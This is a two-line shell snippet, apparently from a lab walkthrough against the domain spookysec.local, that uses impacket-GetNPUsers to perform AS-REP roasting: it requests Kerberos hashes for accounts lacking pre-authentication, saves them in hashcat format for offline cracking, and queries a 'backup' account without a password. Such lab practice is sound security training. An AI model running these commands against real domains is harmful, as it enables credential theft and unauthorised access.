```sh
impacket-GetNPUsers spookysec.local/ -dc-ip 10.10.10.10 -usersfile usernames.txt -format hashcat -outputfile hashes.txt

impacket-GetNPUsers spookysec.local/backup -no-pass -dc-ip 10.10.10.10
```